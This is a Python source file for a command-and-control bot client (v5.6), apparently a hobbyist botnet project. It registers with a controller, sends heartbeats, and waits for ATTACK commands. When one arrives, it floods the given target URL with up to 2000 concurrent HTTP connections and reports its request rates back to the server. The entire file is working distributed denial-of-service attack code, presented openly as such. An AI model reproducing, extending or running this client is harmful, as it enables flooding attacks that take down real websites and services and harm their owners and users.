#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔════════════════════════════════════════════════════════════════════╗
║      Python C&C Bot Client v5.6 - FIX REQUEST SYNC - FINAL        ║
║  Fixed: Real-time Request Counting • Proper Sync • Live Updates  ║
╚════════════════════════════════════════════════════════════════════╝

Author: huynhthienphat
Date: 2025-11-23 15:16:33 UTC
Platform: Multi-OS
"""

import asyncio
import aiohttp
import threading
import time
import sys
import uuid
import urllib3
import os
import socket
import platform
import psutil
import gc
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============= CONFIG =============
SERVER_URL = "http://127.0.0.1:5000"
BOT_ID = f"BOT-{str(uuid.uuid4())[:8]}"
BOT_NAME = socket.gethostname()
HEARTBEAT_INTERVAL = 1  # FIX: More frequent
COMMAND_CHECK_INTERVAL = 1
SYNC_INTERVAL = 1  # FIX: Sync every 1 second

EXTREME_CONNECTIONS = 2000
BATCH_SIZE = 50  # FIX: Sync more frequently
CONNECTION_LIMIT = 2000
TIMEOUT = 1

# FIX: Better tracking
attack_stats = {
    'total_sent': 0,
    'total_failed': 0,
    'start_time': None,
    'peak_rps': 0,
    'is_attacking': False,
    'last_synced_sent': 0,
    'last_synced_failed': 0
}

CURRENT_USER = "huynhthienphat"
CURRENT_TIME = "2025-11-23 15:16:33"

class ExtremeSpeedBot:
    def __init__(self):
        self.running = True
        self.session_requests = self._create_session()
        self.is_attacking = False
    
    def _create_session(self):
        """Create session with retries"""
        session = requests.Session()
        retry = Retry(
            total=3,
            backoff_factor=0.1,
            status_forcelist=(500, 502, 504),
            allowed_methods=["GET", "POST"]
        )
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        return session
    
    async def make_request_extreme(self, session, url, sem):
        """Make single request - FIX: Track properly"""
        async with sem:
            try:
                async with session.get(
                    url,
                    timeout=aiohttp.ClientTimeout(total=TIMEOUT, connect=0.5),
                    ssl=False,
                    allow_redirects=False,
                    headers={'User-Agent': 'Mozilla/5.0'}
                ) as resp:
                    _ = resp.status
                    # FIX: Increment counter immediately
                    attack_stats['total_sent'] += 1
                    return True
            except asyncio.TimeoutError:
                attack_stats['total_failed'] += 1
            except Exception as e:
                attack_stats['total_failed'] += 1
            return False
    
    async def execute_attack(self, target, threads, total_requests):
        """Execute attack - FIX: Continuous sync"""
        print(f"\n{'='*70}")
        print(f"🔥 EXECUTING ATTACK")
        print(f"{'='*70}")
        print(f"Target: {target}")
        print(f"Threads: {threads}")
        print(f"Requests: {total_requests:,}")
        print(f"Sync Interval: Every {BATCH_SIZE} requests")
        print(f"{'='*70}\n")
        
        self.is_attacking = True
        attack_stats['is_attacking'] = True
        attack_stats['total_sent'] = 0
        attack_stats['total_failed'] = 0
        attack_stats['last_synced_sent'] = 0
        attack_stats['last_synced_failed'] = 0
        attack_stats['start_time'] = time.time()
        
        # Normalize URL
        if not target.startswith(('http://', 'https://')):
            target = f"http://{target}"
        
        # Create connector
        connector = aiohttp.TCPConnector(
            limit=EXTREME_CONNECTIONS,
            limit_per_host=EXTREME_CONNECTIONS,
            ttl_dns_cache=300,
            tcp_nodelay=True,
            backoff_factor=0.01,
            force_close=True
        )
        
        timeout = aiohttp.ClientTimeout(
            total=TIMEOUT,
            connect=0.5,
            sock_connect=0.3,
            sock_read=0.3
        )
        
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                sem = asyncio.Semaphore(threads)
                
                # Create all tasks
                tasks = [
                    self.make_request_extreme(session, target, sem)
                    for _ in range(total_requests)
                ]
                
                print(f"📊 Starting attack with {threads} threads...")
                print(f"📡 Will sync progress to server every {BATCH_SIZE} requests\n")
                
                completed = 0
                last_display = time.time()
                
                for task in asyncio.as_completed(tasks):
                    try:
                        await task
                        completed += 1
                        
                        # Display progress
                        now = time.time()
                        if now - last_display >= 0.5:
                            elapsed = now - attack_stats['start_time']
                            rps = attack_stats['total_sent'] / elapsed if elapsed > 0 else 0
                            progress = (completed / total_requests * 100)
                            
                            sys.stdout.write(
                                f"\r✓ {completed:,}/{total_requests:,} ({progress:.1f}%) | "
                                f"Sent: {attack_stats['total_sent']:,} | "
                                f"RPS: {rps:,.0f}"
                            )
                            sys.stdout.flush()
                            last_display = now
                        
                        # FIX: Sync every BATCH_SIZE
                        if completed % BATCH_SIZE == 0:
                            delta_sent = attack_stats['total_sent'] - attack_stats['last_synced_sent']
                            delta_failed = attack_stats['total_failed'] - attack_stats['last_synced_failed']
                            
                            if delta_sent > 0 or delta_failed > 0:
                                self.sync_attack_stats(delta_sent, delta_failed)
                            
                            gc.collect()
                    
                    except Exception as e:
                        pass
        
        except Exception as e:
            print(f"\n❌ Attack error: {e}")
        
        finally:
            self.is_attacking = False
            attack_stats['is_attacking'] = False
        
        # Final sync - FIX: Always sync at end
        delta_sent = attack_stats['total_sent'] - attack_stats['last_synced_sent']
        delta_failed = attack_stats['total_failed'] - attack_stats['last_synced_failed']
        
        if delta_sent > 0 or delta_failed > 0:
            print(f"\n📡 Final sync: {delta_sent:,} requests...")
            self.sync_attack_stats(delta_sent, delta_failed)
        
        elapsed = time.time() - attack_stats['start_time']
        final_rps = attack_stats['total_sent'] / elapsed if elapsed > 0 else 0
        
        print(f"\n\n{'='*70}")
        print(f"✓ ATTACK COMPLETED")
        print(f"{'='*70}")
        print(f"Duration: {elapsed:.2f}s")
        print(f"Total Sent: {attack_stats['total_sent']:,}")
        print(f"Total Failed: {attack_stats['total_failed']:,}")
        print(f"Average RPS: {final_rps:,.0f}")
        print(f"Successfully Synced: {attack_stats['last_synced_sent']:,} to server")
        print(f"{'='*70}\n")
    
    def sync_attack_stats(self, delta_sent, delta_failed):
        """FIX: Sync only deltas and update tracking"""
        try:
            response = self.session_requests.post(
                f"{SERVER_URL}/api/track-request",
                json={
                    'botId': BOT_ID,
                    'count': delta_sent,
                    'failed': delta_failed,
                    'total_sent': attack_stats['total_sent'],
                    'total_failed': attack_stats['total_failed']
                },
                timeout=5,
                verify=False
            )
            
            if response.status_code == 200:
                # FIX: Update tracking after successful sync
                attack_stats['last_synced_sent'] = attack_stats['total_sent']
                attack_stats['last_synced_failed'] = attack_stats['total_failed']
                print(f"\n✓ Synced: +{delta_sent:,} requests to server")
            else:
                print(f"\n⚠️ Sync failed: {response.status_code}")
        
        except Exception as e:
            print(f"\n⚠️ Sync error: {e}")
    
    def check_for_commands(self):
        """Check and execute commands"""
        print("✓ Command listener started\n")
        
        while self.running:
            try:
                response = self.session_requests.post(
                    f"{SERVER_URL}/api/bot/get-command",
                    json={'botId': BOT_ID},
                    timeout=10,
                    verify=False
                )
                
                if response.status_code == 200:
                    data = response.json()
                    
                    if data.get('hasCommand') == True and data.get('command'):
                        command = data.get('command')
                        
                        if command.get('action') == 'ATTACK':
                            target = command.get('target')
                            threads = command.get('threads', 100)
                            requests_count = command.get('requests', 10000)
                            
                            print(f"\n📤 RECEIVED ATTACK COMMAND")
                            print(f"   Target: {target}")
                            print(f"   Threads: {threads}")
                            print(f"   Requests: {requests_count:,}\n")
                            
                            # Execute attack
                            loop = asyncio.new_event_loop()
                            asyncio.set_event_loop(loop)
                            
                            try:
                                loop.run_until_complete(
                                    self.execute_attack(target, threads, requests_count)
                                )
                            except Exception as e:
                                print(f"❌ Attack execution error: {e}")
                            finally:
                                loop.close()
                
                time.sleep(COMMAND_CHECK_INTERVAL)
            
            except Exception as e:
                time.sleep(COMMAND_CHECK_INTERVAL)
    
    def print_banner(self):
        print(f"""
╔════════════════════════════════════════════════════════════════════╗
║      Python C&C Bot Client v5.6 - REAL-TIME REQUEST SYNC          ║
║  Fixed: Request Counting • Continuous Monitoring • Live Tracking  ║
╚════════════════════════════════════════════════════════════════════╝

🤖 Bot Information:
   Name: {BOT_NAME}
   ID: {BOT_ID}
   User: {CURRENT_USER}
   Platform: {platform.system()}

📡 Connection:
   Server: {SERVER_URL}
   Sync Interval: Every {BATCH_SIZE} requests
   Status: Connecting...

⏳ Listening for commands...
🔄 Auto-sync: ENABLED
""")
    
    def start(self):
        """Start bot"""
        self.print_banner()
        
        # Command listener thread
        cmd_thread = threading.Thread(target=self.check_for_commands, daemon=False)
        cmd_thread.start()
        
        # Heartbeat thread - FIX: Sync stats in heartbeat
        hb_thread = threading.Thread(target=self.send_heartbeat, daemon=True)
        hb_thread.start()
        
        print("✓ Bot started and ready!\n")
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\n👋 Shutdown...")
            self.running = False
            cmd_thread.join(timeout=2)
    
    def send_heartbeat(self):
        """FIX: Send heartbeat with current stats"""
        while self.running:
            try:
                self.session_requests.post(
                    f"{SERVER_URL}/api/bot/heartbeat",
                    json={
                        'botId': BOT_ID,
                        'botName': BOT_NAME,
                        'requests_sent': attack_stats['total_sent'],
                        'requests_failed': attack_stats['total_failed'],
                        'status': 'attacking' if attack_stats['is_attacking'] else 'idle',
                        'peak_rps': attack_stats['peak_rps']
                    },
                    timeout=5,
                    verify=False
                )
            except Exception as e:
                pass
            
            time.sleep(HEARTBEAT_INTERVAL)

def register_bot():
    """Register bot"""
    print(f"\n{'='*70}")
    print("🔌 Registering Bot...")
    print(f"{'='*70}\n")
    
    for attempt in range(5):
        try:
            print(f"[{attempt + 1}/5] Connecting to {SERVER_URL}...")
            
            response = requests.post(
                f"{SERVER_URL}/api/bot/register",
                json={
                    'botId': BOT_ID,
                    'botName': BOT_NAME
                },
                timeout=10,
                verify=False
            )
            
            if response.status_code == 200:
                data = response.json()
                print(f"✓ Bot registered successfully!")
                print(f"✓ Bot ID: {BOT_ID}")
                print(f"✓ Bot Name: {BOT_NAME}")
                print(f"✓ Ready to receive commands\n")
                return True
            else:
                print(f"⚠️  Server returned: {response.status_code}")
        
        except Exception as e:
            print(f"❌ Connection failed")
            if attempt < 4:
                print(f"⏳ Retrying in 5 seconds... ({5 - attempt - 1} attempts left)\n")
                time.sleep(5)
    
    print(f"\n❌ Could not connect to server after 5 attempts")
    return False

def main():
    print(f"\n{'='*70}")
    print("🤖 PYTHON C&C BOT CLIENT v5.6 - REQUEST SYNC")
    print(f"{'='*70}")
    print(f"🆔 Bot ID: {BOT_ID}")
    print(f"📝 Bot Name: {BOT_NAME}")
    print(f"👤 User: {CURRENT_USER}")
    print(f"⏰ Time: {CURRENT_TIME} UTC")
    print(f"📡 Server: {SERVER_URL}")
    print(f"{'='*70}\n")
    
    if register_bot():
        bot = ExtremeSpeedBot()
        bot.start()
    else:
        print("❌ Bot registration failed. Cannot proceed.")
        sys.exit(1)

if __name__ == "__main__":
    main()